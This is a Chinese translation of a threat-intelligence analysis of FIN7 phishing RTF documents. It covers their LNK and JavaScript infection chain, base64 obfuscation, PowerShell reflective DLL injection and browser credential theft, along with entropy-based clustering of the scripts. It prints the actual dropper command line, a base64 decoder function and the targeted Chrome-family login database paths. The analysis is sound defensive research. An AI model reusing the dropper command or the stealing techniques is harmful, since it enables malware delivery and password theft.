> 原文链接: https://www.anquanke.com//post/id/86970 


# 【技术分享】深入解析FIN7黑客组织最新攻击技术


                                阅读量   
                                **90036**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：talosintelligence.com
                                <br>原文地址：[http://blog.talosintelligence.com/2017/09/fin7-stealer.html](http://blog.talosintelligence.com/2017/09/fin7-stealer.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t014020a7dc5381337f.png)](https://p4.ssl.qhimg.com/t014020a7dc5381337f.png)

****

译者：[shan66](http://bobao.360.cn/member/contribute?uid=2522399780)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**摘要**

在这篇文章中，我们将详细介绍一个新近发现的RTF文件系列，FIN7黑客组织将这些文档用于网络钓鱼活动，去执行一系列脚本语言代码，其中涉及多种用于绕过传统安全防护机制的混淆技术及其他高级技术。该文档包含诱使用户点击嵌入式对象的消息，而这些嵌入式对象中含有一些恶意脚本，一旦被执行，系统就会被植入用于信息窃取的恶意软件。然后，这些恶意软件就会从流行的浏览器和邮件客户端窃取密码，并发送到攻击者可访问的远程节点。在本文中，我们将对这些高级攻击技术进行详细的探讨。

 

**简介**

2017年6月9日，Morphisec实验室发布了一篇博客文章，详细介绍了一种使用包含嵌入式**JavaScript OLE对象**的RTF文档的新型感染方式。当它被用户单击后，就会启动由JavaScript组成的感染链和最终的**shellcode**的payload，然后通过DNS从远程C&amp;C服务器加载更多的shellcode。在这一篇文章中，我们将揭示这个新的文档变体的细节，该文档使用了一个**LNK**嵌入式OLE对象，它从文档对象中提取出一个**JavaScript bot**，并使用PowerShell将一个“窃贼DLL”注入内存中。这些细节，将有助于洞察诸如FIN7等黑客组织目前所采用的攻击方法，这些组件正在不断演变，以规避安全检测。

**<br>**

**感染方式**

我们遇到的dropper变体通过一个LNK文件，利用来自word文档对象中的JavaScript链的开头部分来执行wscript.exe。

```
C:WindowsSystem32cmd.exe......WindowsSystem32cmd.exe /C set x=wsc@ript /e:js@cript %HOMEPATH%md5.txt &amp; echo try`{`w=GetObject("","Wor"+"d.Application");this[String.fromCharCode(101)+'va'+'l'](w.ActiveDocument.Shapes(1).TextFrame.TextRange.Text);`}`catch(e)`{``}`; &gt;%HOMEPATH%md5.txt &amp; echo %x:@=%|cmd
```

这个攻击链涉及大量base64编码的JavaScript文件，JavaScript bot的所有组件都是由这些文件构成的。此外，其中还包含完成反射式DLL注入的PowerShell代码，用于注入信息窃取恶意软件演变而成的DLL，这些将在下文中深入讨论。

 

**对解码后的JavaScript函数进行聚类分析**

这些文档中的每一个都可以生成多达40个JavaScript文件。为了找出相似的技术，我们决定使用给定JavaScript文件的熵和base64的解码深度对其进行聚类，然后使用ggplot和ggiraph的R库以散点图的形式来展示文件聚类结果。

在我们演示分析结果之前，我们先来解释一下用于绘制和聚类JavaScript文件的这些值。 

**<br>**

**Base64编码**

大多数JavaScript的混淆处理都是通过嵌套base64编码来完成的。 Base64是一种从二进制到文本的编码方案，可用于表示任何类型的数据。对于这些文档来说，Base64用于对JavaScript进行多次编码，这是一种对付传统反病毒软件的常用手段，因为这些反病毒软件只能模拟有限次迭代的JavaScript指令。这些base64块采用硬编码或逗号分隔，之后将其串接起来进行解码，就能得到要执行的JavaScript代码。解码的时候，可以调用CDO.Message ActiveXObject，并将ContentTransferEncoding指定为base64（请注意，Windows-1251字符集是西里尔文，说明它可能来自使用俄语的国家）：



```
function b64dec(data)`{`
 
    var cdo = new ActiveXObject("CDO.Message");
    var bp = cdo.BodyPart;
    bp.ContentTransferEncoding = "base64";
    bp.Charset = "windows-1251";
    var st = bp.GetEncodedContentStream();
    st.WriteText(data);
    st.Flush();
    st = bp.GetDecodedContentStream();
    st.Charset = "utf-8";
    return st.ReadText;
`}`
```



然后使用一个经过混淆的函数调用进行处理，例如：

```
MyName.getGlct()[String.fromCharCode(101)+'va'+'l'](b64dec(energy));
```

经过这些base64解码步骤的处理后，最后会得到JavaScript bot的各个执行分支，以及将“窃贼DLL”注入到内存中的代码：

[![](https://p4.ssl.qhimg.com/t014b16c7112b8a8e58.png)](https://p4.ssl.qhimg.com/t014b16c7112b8a8e58.png)

图1：基于JavaScript和DLL注入的文档感染链

**<br>**

**JavaScript的熵**

熵可以用来评估给定数量的数据的无序性和不确定性。在本文中，我们会根据它来计算提取出来的JavaScript文件的相关度，因为这些文档的变体包含类似的功能，但使用混淆机制后，增加了聚类分析的难度。为此，我们可以使用Ero Carrera提供的Python代码：



```
import math 
 
def H(data): 
    if not data: 
        return 0 
    entropy = 0 
    for x in range(256): 
        p_x = float(data.count(chr(x)))/len(data) 
        if p_x &gt; 0: 
           entropy += - p_x*math.log(p_x, 2) 
    return entropy
```



在计算了每个JavaScript文件的熵之后，它将作为下面的散点图的X轴。

**<br>**

**展示聚类分析和JavaScript功能的散点图**

我们从最初文档集开始，因为它不包含dropper DLL。然后，我们计算出生成各个文件（Y轴）所需的base64解码量，并计算它们各自的熵（X轴）。然后，我们考察各个散点图分组，并将其各自的功能标记为红色：

[![](https://p2.ssl.qhimg.com/t015f23955dec4ea880.png)](https://p2.ssl.qhimg.com/t015f23955dec4ea880.png)

图2：基于熵和base64解码深度的散点图

通过这个散点图，我们可以得到下列结论：

1.    base64解码深度越深，越有可能是我们要找的功能

2.    实现bot功能和C2通信的JavaScript代码位于多组解码深度和熵比较接近的文件中

3.    任务调度功能的解码深度和熵差异比较明显

然后，我们将相同的技术应用于运送整个base64编码和压缩DLL的第二代文档上：

[![](https://p4.ssl.qhimg.com/t010d16bd9583b3d05d.png)](https://p4.ssl.qhimg.com/t010d16bd9583b3d05d.png)

图3：PowerShell DLL文件的散点图

那些离群值代表解码后的DLL和XML任务文件。当这些组件从散点图中移除（仅留下JavaScript）后，我们看到与第一代文档类似的簇：

[![](https://p4.ssl.qhimg.com/t015c5b6cbc62e6ed66.png)](https://p4.ssl.qhimg.com/t015c5b6cbc62e6ed66.png)

图4：修改后的PowerShell DLL文件散点图

基于簇的数量和熵的范围，我们发现这一代文档包含更多的具有不同功能和深度的文件。该绘图技术还提供了一种通过显示离群值来识别新功能的方法，例如标记PS的离群值，其中存放的是一组经过编码的PowerShell字节，而不是提供DLL注入的最终PowerShell的编码块：

[![](https://p5.ssl.qhimg.com/t01415409b379254e2a.png)](https://p5.ssl.qhimg.com/t01415409b379254e2a.png)

图5：根据熵的离群值识别新的PowerShell功能

**<br>**

**JavaScript代码混淆的变化**

一旦对相似的功能进行了聚类分析，生成的文档之间的变化就会变得很明显。变量名称和GUID路径都发生了变化：

[![](https://p0.ssl.qhimg.com/t01140ee1252ac04a16.png)](https://p0.ssl.qhimg.com/t01140ee1252ac04a16.png)

图6：变量和路径GUID JS的变化

这个功能还使得一些有趣的模糊机制变得更加显眼，而这些机制通常会被一些仿真引擎可所忽略。待考查的JavaScript的函数体似乎位于多行注释中，但实际上这被视为多行字符串。下面，我们通过Chrome的脚本控制台中进行测试：

[![](https://p2.ssl.qhimg.com/t018245b56d7ca495ad.png)](https://p2.ssl.qhimg.com/t018245b56d7ca495ad.png)

图7：JavaScript多行注释字符串混淆技术

函数被重新排序：

[![](https://p3.ssl.qhimg.com/t0174cf43b647556783.png)](https://p3.ssl.qhimg.com/t0174cf43b647556783.png)

图8：重新排序的函数示例

C&amp;C地址也变了：

[![](https://p4.ssl.qhimg.com/t01f2610b914ddd64ea.png)](https://p4.ssl.qhimg.com/t01f2610b914ddd64ea.png)

图9：变化的C&amp;C地址

变化的base64编码深度，可以使用我们的散点图来识别，如PowerShell的写入和执行功能：

[![](https://p4.ssl.qhimg.com/t01aa85830e3c1ef4df.png)](https://p4.ssl.qhimg.com/t01aa85830e3c1ef4df.png)

图10：具有不同Base64解码深度的PowerShell写入和执行功能

下面我们看看相同的功能在不同的解码深度下的情形：

[![](https://p1.ssl.qhimg.com/t0131faa5d025113247.png)](https://p1.ssl.qhimg.com/t0131faa5d025113247.png)

图11：比较PowerShell写入和执行功能的代码

 

**“窃贼DLL”**

**复原DLL**

这些JavaScript解码链的最后一个组成部分是PowerShell反射式DLL注入脚本，其中包含Powersploit的Invoke-ReflectivePEInjection中的复制粘贴函数。 DLL通过解码base64 blob进行来进行反混淆，并使用IO.Compression.DeflateStream解压生成的字节。为了复原DLL，我们可以使用[io.file] :: WriteAllBytes直接将解压缩的字节写入磁盘。

[![](https://p2.ssl.qhimg.com/t016747172d307646a6.png)](https://p2.ssl.qhimg.com/t016747172d307646a6.png)

图12：对PowerShell流进行解压并将DLL写入磁盘

[![](https://p2.ssl.qhimg.com/t01183b25f25bbdeb8e.png)](https://p2.ssl.qhimg.com/t01183b25f25bbdeb8e.png)

图13：复制粘贴式PowerSploit Invoke-ReflectivePE注入代码

**“窃贼DLL”的功能**

我们在2016年8月写了一篇关于H1N1 dropper的博客文章，该文章引用了一个字符串去混淆脚本来处理多个32位值的XOR、ADD和SUB字符串混淆技术。该脚本能够处理该“窃贼DLL”中的类似功能：

[![](https://p3.ssl.qhimg.com/t011ffc1d5f28c93254.png)](https://p3.ssl.qhimg.com/t011ffc1d5f28c93254.png)

图14：Firefox字符串解码

导入哈希功能需要解析给定DLL的导出表（常用于打包器/恶意软件）：

[![](https://p5.ssl.qhimg.com/t01a3f5f6060a01d140.png)](https://p5.ssl.qhimg.com/t01a3f5f6060a01d140.png)

图15：PowerShell注入的DLL的哈希功能的PE偏移量

为了进行解析，需要在给定的导出值上使用XOR和ROL算法以便与导出表的给定哈希值进行比较：

[![](https://p2.ssl.qhimg.com/t01d682900af7553161.png)](https://p2.ssl.qhimg.com/t01d682900af7553161.png)

图16：PowerShell 注入的DLL哈希算法

该DLL还包含数据窃取功能，比如使用CryptUnprotectData通过散列缓存的URL解密Intelliform数据：

[![](https://p3.ssl.qhimg.com/t0198e9bee1941a82b4.png)](https://p3.ssl.qhimg.com/t0198e9bee1941a82b4.png)

图17：PowerShell注入的DLL的Intelliform数据窃取功能

该二进制文件还包含窃取Outlook和Firefox数据的功能，以及从Chrome浏览器、Chromium、Chromium和Opera浏览器的存储卡中窃取登录信息的功能，这些将在下一节进一步讨论。 

**<br>**

**窃取Chrome、Chromium和Opera凭证**

针对Chrome、Chromium、Chromium分支和Opera浏览器的证书窃取功能，会打开[Database Path]  Login Data sqlite3数据库，读取URL、用户名和密码字段，并调用CryptUnprotectData来解密用户密码。它会在％APPDATA％、％PROGRAMDATA％和％LOCALAPPDATA％路径中查找这个数据库：



```
GoogleChromeUser DataDefaultLogin Data
    ChromiumUser DataDefaultLogin Data
    MapleStudioChromePlusUser DataDefaultLogin Data
    YandexBrowseUser DataDefaultLogin Data
    NichromUser DataDefaultLogin Data
    ComodoDragonUser DataDefaultLogin Data
```

虽然Opera并非Chromium的分支，但最新版本的证书却具有相同的实现方式： Opera Software  Opera Stable  Login Data

**<br>**

**用于窃取数据的命令和控制代码**

除了JavaScript bot功能之外，被盗数据将被转储到％APPDATA％％USERNAME％.ini，并将该文件的创建时间设置为ntdll.dll的创建时间。这些数据是通过SimpleEncrypt函数进行读取和加密的，通过函数名称可以猜到，这是一个简单的替换密码函数：

[![](https://p1.ssl.qhimg.com/t016c32e8352069a969.png)](https://p1.ssl.qhimg.com/t016c32e8352069a969.png)

图18：C&amp;C的数据替换

然后，该恶意软件会将其POST到硬编码的命令和控制服务器地址，包括Google Apps脚本托管服务（我们还注意到了alfIn变量的声明，它是用于替换密码的字母表）：

[![](https://p0.ssl.qhimg.com/t01fd919f19492ec048.png)](https://p0.ssl.qhimg.com/t01fd919f19492ec048.png)

图19：C&amp;C的数据发送 

 

**结论**

FIN7是一个专业的商业间谍组织，为了应对各种安全检测，他们使用了许多非常高级的黑客技术。例如，通过使用Microsoft Word文档来运送整个恶意软件平台，可以利用脚本语言来访问ActiveX控件，还可以使用PowerShell通过“无文件”方式将运送的PE文件注入到内存中，这样就不会让这些代码有机会接触硬盘了。通过对这些JavaScript代码进行聚类分析能够找出FIN7的不同版本的恶意软件的细微差别，通过离群值可发现其重大变化。
